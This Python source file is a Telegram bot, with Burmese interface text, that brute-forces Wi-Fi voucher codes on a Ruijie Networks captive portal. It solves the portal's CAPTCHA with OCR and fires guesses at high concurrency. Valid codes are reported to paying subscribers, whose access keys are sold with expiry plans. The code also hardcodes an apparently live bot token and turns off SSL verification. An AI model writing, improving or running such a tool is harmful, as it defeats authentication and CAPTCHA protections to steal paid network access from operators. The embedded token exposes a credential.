import telebot, asyncio, aiohttp, json, base64, random, re, os, string, time, uuid
from telebot.async_telebot import AsyncTeleBot
from aiohttp import web
import cv2
import ddddocr
import numpy as np
from datetime import datetime, timedelta, timezone

# Bot Configuration
BOT_TOKEN = "8920875247:AAHowI29h7xFaDbyk9bCWXvsxIYhrk9CdVw"
ADMIN_ID = "1901101365"

# GitHub Configuration (Render Environment Variables)
GITHUB_TOKEN = os.environ.get("GITHUB_TOKEN")
GITHUB_REPO = os.environ.get("GITHUB_REPO")

SUCCESS_CODE = asyncio.Queue()
bot = AsyncTeleBot(BOT_TOKEN)
user_data = {}
approve = {}
scan_tasks = {}
success_messages = {}
success_texts = {}
limited_messages = {}
limited_texts = {}
captcha_state = {}
retry_counts = {}
session = None
_connector = None
CONCURRENCY = 100
_voucher_sem = None
_start_time = time.monotonic()

async def handle(request):
    return web.Response(text="Bot is awake and running 24/7 on Render with GitHub Storage!")

async def web_server():
    app = web.Application()
    app.router.add_get('/', handle)
    runner = web.AppRunner(app)
    await runner.setup()
    port = int(os.environ.get('PORT', 8099))
    site = web.TCPSite(runner, '0.0.0.0', port)
    await site.start()
    print(f"Web server started on port {port}")

async def get_file_content(path):
    if not GITHUB_TOKEN or not GITHUB_REPO:
        print("GitHub configuration missing")
        return {}, None
    url = f"https://api.github.com/repos/{GITHUB_REPO}/contents/{path}"
    headers = {"Authorization": f"token {GITHUB_TOKEN}", "Accept": "application/vnd.github.v3+json"}
    try:
        async with aiohttp.ClientSession() as sess:
            async with sess.get(url, headers=headers) as resp:
                if resp.status == 200:
                    data = await resp.json()
                    content = base64.b64decode(data['content']).decode('utf-8')
                    return json.loads(content), data['sha']
                elif resp.status == 404:
                    return {}, None
                else:
                    print(f"GitHub Fetch Error: {resp.status}")
                    return {}, None
    except Exception as e:
        print(f"GitHub Get Content Error: {e}")
        return {}, None

async def update_file_content(path, content, sha, message):
    if not GITHUB_TOKEN or not GITHUB_REPO:
        return "No Config"
    url = f"https://api.github.com/repos/{GITHUB_REPO}/contents/{path}"
    headers = {"Authorization": f"token {GITHUB_TOKEN}", "Accept": "application/vnd.github.v3+json"}
    payload = {
        "message": message,
        "content": base64.b64encode(json.dumps(content, indent=4).encode('utf-8')).decode('utf-8')
    }
    if sha:
        payload["sha"] = sha
    try:
        async with aiohttp.ClientSession() as sess:
            async with sess.put(url, headers=headers, json=payload) as resp:
                if resp.status in [200, 201]:
                    return "saved"
                else:
                    print(f"GitHub Update Error: {resp.status}")
                    return "failed"
    except Exception as e:
        print(f"GitHub Update Content Error: {e}")
        return str(e)

@bot.message_handler(commands=['start'])
async def start(message):
    await bot.reply_to(message, "Bot စတင်ပါပြီ။ /key ဖြင့်စတင်ပါ။")

@bot.message_handler(commands=['key'])
async def handle_key(message):
    global approve
    key = str(message.chat.id)
    auth_list, _ = await get_file_content("auth_list.json")
    if key == ADMIN_ID or key in auth_list:
        valid = True if key == ADMIN_ID else check_key_expiration(auth_list[key])
        if valid:
            approve[message.chat.id] = True
            user_data[message.chat.id] = {}
            await bot.reply_to(message, " Key မှန်ကန်ပါသည်။ /input ဖြင့် Session URL ထည့်ပါ။")
        else:
            approve[message.chat.id] = False
            await bot.reply_to(message, " Key Expired ဖြစ်နေပါသည်။")
    else:
        await bot.reply_to(message, " သင်၏ key ကို registered မလုပ်ရသေးပါ။")

@bot.message_handler(commands=['listkeys'])
async def listkeys(message):
    if str(message.chat.id) != ADMIN_ID:
        await bot.reply_to(message, "No Permission")
        return
    try:
        auth_list, _ = await get_file_content("auth_list.json")
        if not auth_list:
            await bot.reply_to(message, "Registered key မရှိသေးပါ။")
            return
        lines = []
        for uid, data in auth_list.items():
            if isinstance(data, dict):
                expires = data.get("expires_at", "unknown")
                plan = data.get("plan", "unknown")
                expires_str = "Unlimited" if expires == "9999-12-31T23:59:59Z" else expires
            else:
                plan, expires_str = "old", str(data)
            lines.append(f"👤 {uid}\n   Plan: {plan}\n   Expires: {expires_str}")
        text = f"📋 Registered Keys ({len(auth_list)})\n\n" + "\n\n".join(lines)
        await bot.reply_to(message, text[:4096])
    except Exception as e:
        print(f"Error at listkeys {e}")

@bot.message_handler(commands=['genkey'])
async def genkey(message):
    if str(message.chat.id) != ADMIN_ID:
        await bot.reply_to(message, "No Permission")
        return
    try:
        args = message.text.split()
        if len(args) < 3:
            await bot.reply_to(message, "Usage: /genkey 1h 123456789")
            return
        plan, user_id = args[1], args[2]
        expiry = generate_expiry(plan)
        if not expiry:
            await bot.reply_to(message, "Plans: 30m, 1h, 1d, 7d, 1m, 1y, unlimited")
            return
        auth_list, sha = await get_file_content("auth_list.json")
        auth_list[user_id] = {"expires_at": expiry, "plan": plan}
        await update_file_content("auth_list.json", auth_list, sha, f"Add key for {user_id}")
        await bot.reply_to(message, f" Key Generated\nUSER ID: {user_id}\nPLAN: {plan}\nEXPIRES: {expiry}")
    except Exception as e:
        print(f"Error at genkey {e}")

@bot.message_handler(commands=['result'])
async def handle_result(message):
    auth_list, _ = await get_file_content("auth_list.json")
    if str(message.chat.id) == ADMIN_ID or str(message.chat.id) in auth_list:
        results, _ = await get_file_content("result.json")
        chat_id_str = str(message.chat.id)
        if chat_id_str in results and results[chat_id_str]:
            codes = "\n".join(results[chat_id_str])
            await bot.reply_to(message, f"✅ Found Codes:\n{codes}")
        else:
            await bot.reply_to(message, "သင့်တွင် ယခင်ကရရှိထားသေး code မရှိသေးပါ။")
    else:
        await bot.reply_to(message, "သင်၏ key ကို registered မပြုလုပ်ရသေးပါ။")

def check_key_expiration(expiration_time):
    try:
        if isinstance(expiration_time, dict):
            expiry = expiration_time.get("expires_at")
            if expiry == "9999-12-31T23:59:59Z": return True
            return datetime.now(timezone.utc) < datetime.fromisoformat(expiry.replace("Z", "+00:00"))
        return False
    except: return False

def generate_expiry(plan):
    now = datetime.now(timezone.utc)
    plans = {"30m": 30, "1h": 60, "1d": 1440, "7d": 10080, "1m": 43200, "1y": 525600}
    if plan == "unlimited": return "9999-12-31T23:59:59Z"
    return (now + timedelta(minutes=plans.get(plan, 0))).isoformat() if plan in plans else None

async def check_session_url(url):
    if "ruijienetworks.com" in url:
        return True
    return False

@bot.message_handler(commands=['input'])
async def handle_input(message):
    args = message.text.split(maxsplit=1)
    if len(args) < 2:
        await bot.reply_to(message, "Usage: /input your_session_url")
        return
    url = args[1]
    if message.chat.id in approve and approve[message.chat.id]:
        if await check_session_url(url):
            user_data[message.chat.id]['session_url'] = url
            await bot.reply_to(message, "Session URL သိမ်းပြီးပါပြီ။ /scan 6, 7, 8 စသည်ဖြင့် စတင်ပါ။")
        else:
            await bot.reply_to(message, "Session URL မှားယွင်းနေပါသည်။")
    else:
        await bot.reply_to(message, "/key အရင်လုပ်ပါ။")

@bot.message_handler(commands=['scan'])
async def scan(message):
    args = message.text.split(maxsplit=1)
    if len(args) < 2:
        await bot.reply_to(message, "Usage: /scan <6, 7, 8, ascii-lower, all>")
        return
    mode = args[1]
    chat_id = message.chat.id
    if not approve.get(chat_id, False) or 'session_url' not in user_data.get(chat_id, {}):
        await bot.reply_to(message, "/key နှင့် /input အရင်လုပ်ပါ။")
        return
    progress_msg = await bot.send_message(chat_id, "🔍Scanning Codes...")
    scan_id = str(uuid.uuid4())
    task = asyncio.create_task(run_bruteforce(mode, chat_id, user_data[chat_id]['session_url'], scan_id, message, progress_msg))
    scan_tasks[chat_id] = {"task": task, "stop": False, "scan_id": scan_id}

@bot.message_handler(commands=['stop'])
async def stop_scan(message):
    chat_id = message.chat.id
    if chat_id in scan_tasks:
        scan_tasks[chat_id]["stop"] = True
        await bot.reply_to(message, "/scan ကို ရပ်တန့်ပြီးပါပြီ။")
    else:
        await bot.reply_to(message, "ရပ်တန့်ရန် scan အလုပ်မရှိပါ။")

async def github_update_scheduler():
    while True:
        await asyncio.sleep(60)
        items = []
        while not SUCCESS_CODE.empty(): items.append(await SUCCESS_CODE.get())
        if items:
            results, sha = await get_file_content("result.json")
            for item in items:
                uid, code = str(item["chat_id"]), item["code"]
                if uid not in results: results[uid] = []
                if code not in results[uid]: results[uid].append(code)
            await update_file_content("result.json", results, sha, "Periodic Update")

def iter_codes(mode):
    if mode in ["6", "7"]:
        length = int(mode)
        codes = [str(i).zfill(length) for i in range(10 ** length)]
        random.shuffle(codes)
        yield from codes
        return
    if mode == "8":
        while True: yield "".join(random.choice(string.digits) for _ in range(8))
    if mode == "ascii-lower":
        while True: yield "".join(random.choice(string.ascii_lowercase) for _ in range(6))
    if mode == "all":
        while True: yield "".join(random.choice(string.ascii_lowercase + string.digits) for _ in range(6))
    raise ValueError(f"Unsupported scan mode: {mode}")

def format_progress(checked, total, speed, found, retries):
    speed_str = f"{speed:,.0f} codes/min"
    if total:
        percent = (checked / total) * 100
        bar = "█" * int(percent / 5) + "░" * (20 - int(percent / 5))
        return f"🔍Scanning Codes...\n\n📦Checked : {checked:,}/{total:,}\n📊Progress : {percent:.2f}%\n⚡Speed : {speed_str}\n✅Found : {found}\n🔁Retry : {retries}\n[{bar}]"
    return f"🔍Scanning Codes...\n\n📦Checked : {checked:,}\n⚡Speed : {speed_str}\n✅Found : {found}\n🔁Retry : {retries}\n📊Status : running"

async def run_bruteforce(mode, chat_id, session_url, scan_id, message, progress_msg):
    try: code_iter = iter_codes(mode)
    except Exception as e: await bot.send_message(chat_id, str(e)); return
    total = 10 ** int(mode) if mode in ["6", "7"] else None
    checked, scan_start = 0, time.monotonic()
    global _voucher_sem
    if _voucher_sem is None: _voucher_sem = asyncio.Semaphore(CONCURRENCY)
    try:
        while True:
            current = scan_tasks.get(chat_id)
            if not current or current.get("scan_id") != scan_id or current.get("stop"): break
            batch = []
            for _ in range(100):
                try: batch.append(next(code_iter))
                except StopIteration: break
            if not batch: break
            await asyncio.gather(*[perform_check(session_url, c, chat_id, scan_id, message=message) for c in batch], return_exceptions=True)
            checked += len(batch)
            elapsed = time.monotonic() - scan_start
            speed = (checked / elapsed * 60) if elapsed > 0 else 0
            found = len(success_texts.get(chat_id, []))
            retries = retry_counts.get(chat_id, 0)
            if checked % 500 == 0:
                try: await bot.edit_message_text(chat_id=chat_id, message_id=progress_msg.message_id, text=format_progress(checked, total, speed, found, retries))
                except: pass
        await bot.send_message(chat_id, "🔍Scanning Completed")
    finally: scan_tasks.pop(chat_id, None)

async def get_session_id(session, session_url):
    try:
        async with session.get(session_url, allow_redirects=True) as req:
            sid = re.search(r"[?&]sessionId=([a-zA-Z0-9]+)", str(req.url))
            return sid.group(1) if sid else None
    except: return None

async def perform_check(session_url, code, chat_id, scan_id, message=None):
    post_url = "https://portal-as.ruijienetworks.com/api/auth/voucher/?lang=en_US"
    async with aiohttp.ClientSession(connector=_connector, connector_owner=False) as sess:
        sid = await get_session_id(sess, session_url)
        if not sid: return
        for _ in range(5):
            img = await sess.get(f'https://portal-as.ruijienetworks.com/api/auth/captcha/image?sessionId={sid}&_t={time.time()}')
            img_bytes = await img.read()
            text = await asyncio.to_thread(lambda: _ocr.classification(img_bytes).upper())
            v = await sess.post('https://portal-as.ruijienetworks.com/api/auth/captcha/verify', json={'sessionId': sid, 'authCode': text})
            v_data = await v.json()
            if v_data.get("success"):
                data = {"accessCode": code, "sessionId": sid, "apiVersion": 1, "authCode": text}
                async with sess.post(post_url, json=data) as req:
                    resp = await req.json()
                    if 'logonUrl' in str(resp):
                        if chat_id not in success_texts: success_texts[chat_id] = []
                        success_texts[chat_id].append(f"🎫 {code}")
                        await SUCCESS_CODE.put({"chat_id": chat_id, "code": code})
                        await bot.send_message(chat_id, f"✅ Success Code Found: {code}")
                    return
    retry_counts[chat_id] = retry_counts.get(chat_id, 0) + 1

_ocr = ddddocr.DdddOcr(show_ad=False)

async def main():
    global session, _connector
    _connector = aiohttp.TCPConnector(limit=500, ssl=False)
    session = aiohttp.ClientSession(connector=_connector)
    asyncio.create_task(web_server())
    asyncio.create_task(github_update_scheduler())
    await bot.infinity_polling()

if __name__ == '__main__':
    asyncio.run(main())
